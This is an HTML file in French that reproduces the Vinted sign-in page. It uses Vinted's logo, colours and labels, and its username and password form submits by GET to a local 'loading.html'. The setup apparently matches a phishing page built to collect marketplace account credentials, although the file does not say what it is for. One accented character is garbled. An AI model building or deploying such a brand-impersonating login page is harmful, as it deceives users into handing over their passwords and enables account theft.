<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Se connecter - Vinted</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #ffffff;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        .logo {
            margin-bottom: 25px;
        }
        .logo img {
            max-width: 150px;
            height: auto;
            border: 0;
        }
        h2 {
            font-size: 26px;
            color: #007b76;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 15px;
            text-align: left;
        }
        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
            color: #555;
        }
        .form-group input[type="text"],
        .form-group input[type="password"] {
            width: calc(100% - 20px);
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
        }
        .form-group input[type="text"]:focus,
        .form-group input[type="password"]:focus {
            border-color: #007b76;
            outline: none;
            box-shadow: 0 0 0 2px rgba(0, 123, 118, 0.25);
        }
        button[type="submit"] {
            width: 100%;
            padding: 12px;
            background-color: #007b76;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: background-color 0.3s ease;
            margin-top: 10px;
        }
        button[type="submit"]:hover {
            background-color: #00605c;
        }
        .info-text {
            font-size: 14px;
            color: #666;
            margin-top: 20px;
        }
        .info-text a {
            color: #007b76;
            text-decoration: none;
        }
        .info-text a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Vinted_Logo_2022.svg/1280px-Vinted_Logo_2022.svg.png" alt="Logo Vinted">
        </div>
        <h2>Se connecter</h2>
        <form action="loading.html">
            <div class="form-group">
                <label for="username">Nom d'utilisateur ou e-mail</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="form-group">
                <label for="password">Mot de passe</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit">Se connecter</button>
        </form>
        <p class="info-text">
            Vous n'avez pas de compte ? <a href="#">S'inscrire</a><br>
            <a href="#">Mot de passe oubli√© ?</a>
        </p>
    </div>
</body>
</html>
